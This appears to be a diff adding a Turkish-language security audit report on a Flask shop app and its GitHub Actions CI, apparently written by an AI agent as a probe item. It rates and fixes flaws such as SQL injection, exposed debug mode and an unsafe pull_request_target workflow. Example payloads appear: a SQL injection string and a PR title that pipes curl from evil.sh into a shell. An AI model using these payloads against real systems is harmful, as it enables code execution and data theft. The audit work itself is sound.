@@ -1,0 +1,59 @@
+[probe p12]
+# Güvenlik Denetimi Bulguları
+
+Denetlenen dosyalar: `app.py`, `requirements.txt`, `.github/workflows/ci.yml`. Kodu değiştirmedim. Yayına almadan önce kritik ve yüksek bulguların kapatılmasını öneririm.
+
+## Kritik
+
+**1. Debug modu açık ve tüm ağ arayüzlerine bağlı** (`app.py:40`)
+`app.run(host="0.0.0.0", port=8000, debug=True)` satırı Werkzeug etkileşimli debugger'ını dışarıya açar. Bir hata sayfasına ulaşan saldırgan sunucuda uzaktan kod çalıştırabilir. PIN koruması vardır ama güvenilir bir engel değildir. Üretimde Flask'ın geliştirme sunucusu da kullanılmamalıdır. Gunicorn veya uWSGI gibi bir WSGI sunucusu kullanın, debug'ı kapatın ve bir ters vekil arkasına alın.
+
+**2. SQL injection** (`app.py:28`)
+`/orders` uç noktası `customer` parametresini f-string ile sorguya ekler. Örneğin `?customer=' OR '1'='1` tüm siparişleri döker. `UNION SELECT` ile `users` tablosundaki parola özetleri de okunabilir. Düzeltme: `conn.execute("... WHERE customer = ?", (customer,))`. Bu uç noktada kimlik doğrulama ve yetki kontrolü de yok, yani herkes herhangi bir müşterinin siparişini sorgulayabilir (IDOR).
+
+**3. Kimlik doğrulamasız `/admin/export`** (`app.py:32-36`)
+Giriş veya yetki kontrolü olmadan `SELECT * FROM users` döner. Bu, tüm kullanıcı adlarını ve parola özetlerini herkese açar. Uç noktayı kaldırın veya sunucu tarafı yetkilendirmeyle (admin rolü) koruyun, ayrıca parola sütununu asla döndürmeyin.
+
+**4. CI iş akışında `pull_request_target` ile güvenilmeyen kod çalıştırma** (`ci.yml:3-14`)
+İş akışı, depo sırlarına ve yazma yetkili `GITHUB_TOKEN`'a erişimle çalışır, ama PR'ın head commit'ini checkout edip `pip install -r requirements.txt` ve `pytest` çalıştırır. Fork'tan gelen bir PR, `requirements.txt`, `conftest.py` veya testler üzerinden keyfi kod çalıştırarak sırları çalabilir. Ek olarak `${{ github.event.pull_request.title }}` doğrudan `run` içine enjekte edilmiştir. PR başlığı `"; curl evil.sh | sh; "` gibi olabilir (script injection). Düzeltme: `pull_request` tetikleyicisine geçin. `pull_request_target` gerçekten gerekiyorsa PR kodunu checkout etmeyin. Başlık gibi değerleri `env:` üzerinden aktarın. `permissions:` bloğunu en az yetkiyle tanımlayın.
+
+## Yüksek
+
+**5. Zayıf parola özeti: MD5, tuzsuz** (`app.py:18`)
+MD5 hızlıdır ve tuz kullanılmaz. Bu yüzden #3 veya #2 ile sızan özetler gökkuşağı tablolarıyla dakikalar içinde kırılır. Aynı parolalar aynı özeti üretir. `werkzeug.security.generate_password_hash` (scrypt/PBKDF2), `argon2-cffi` veya `bcrypt` kullanın.
+
+**6. Sabit kodlanmış, tahmin edilebilir `SECRET_KEY`** (`app.py:7`)
+Değer depoda açıkta duruyor ve `"change-me-secret-key"` bir yer tutucu. Oturum çerezleri ve imzalı veriler sahte üretilebilir. Anahtarı ortam değişkeninden veya bir sır yöneticisinden okuyun. Depo geçmişinde göründüğü için anahtarı yenileyin.
+
+## Orta
+
+**7. Kayıt uç noktasında doğrulama ve hata yönetimi yok** (`app.py:15-21`)
+- `request.form["name"]` eksikse 400 döner, ama boş veya aşırı uzun değerler ve parola karmaşıklığı denetlenmiyor.
+- Aynı kullanıcı adı için tekrar kaydı engelleyen bir kontrol görünmüyor (şemada UNIQUE kısıtı olup olmadığı koddan anlaşılmıyor).
+- Hız sınırlama (rate limiting) yok. Kayıt spam'i ve ileride eklenecek giriş için kaba kuvvet saldırısı mümkün.
+- CSRF koruması yok. Şu an oturum kullanılmıyor, ama oturum eklenirse gerekecek.
+
+**8. Bağımlılık sabitlenmemiş** (`requirements.txt`)
+`Flask>=3.1.3` üst sınırsızdır. Derlemeler tekrarlanabilir değildir ve gelecekte uyumsuz veya ele geçirilmiş bir sürüm gelebilir. Kilit dosyası (hash'li `pip-compile` veya `uv.lock`) kullanın ve CI'da `pip-audit` çalıştırın. Bu ortamda internet olmadığı için sürümlerin bilinen CVE'lerini kontrol edemedim.
+
+**9. Taşıma güvenliği ve güvenlik başlıkları yok**
+Uygulama düz HTTP sunuyor. TLS'i ters vekilde sonlandırın. HSTS, `X-Content-Type-Options` gibi başlıkları ekleyin (örneğin Flask-Talisman ile).
+
+## Düşük / Bilgi
+
+- **Veritabanı dosyası** (`shop.db`) göreli yoldadır. Çalışma dizinine bağlıdır ve web kök dizininden erişilebilir bir konuma düşmediğinden emin olun. `.gitignore` dosyası yok, bu yüzden yanlışlıkla commit edilebilir.
+- **Tablo şeması depoda yok.** `users` ve `orders` tabloları kodda oluşturulmuyor, bu yüzden kısıtlamalar (UNIQUE, NOT NULL) doğrulanamadı.
+- **Test yok.** CI `pytest` çalıştırıyor ama depoda test dosyası görünmüyor.
+- **Günlükleme ve izleme yok.** Kimlik doğrulama olayları ve hatalar için denetim izi tutulmuyor.
+- **Git geçmişi:** Tek commit (`42761a0 x`) var. `.git` içinde başka sır olup olmadığını araçlarımla tam tarayamadım (shell erişimi kapalı). Sırlar için `gitleaks` gibi bir araç çalıştırmanızı öneririm.
+
+## Önerilen sıra
+
+1. `debug=True` ve `0.0.0.0` kaldırılsın, üretim WSGI sunucusuna geçilsin (#1).
+2. SQL sorgusu parametrelensin (#2).
+3. `/admin/export` kaldırılsın veya yetkilendirilsin (#3).
+4. CI iş akışı düzeltilsin (#4).
+5. Parola özeti ve `SECRET_KEY` düzeltilsin (#5, #6), mevcut kullanıcı parolaları sıfırlansın.
+6. Kalan orta ve düşük maddeler.
+
+Kapsam notu: Yalnızca statik okuma yaptım. Uygulamayı çalıştırmadım ve ağ erişimi olmadığı için bağımlılık zafiyet taraması yapamadım.
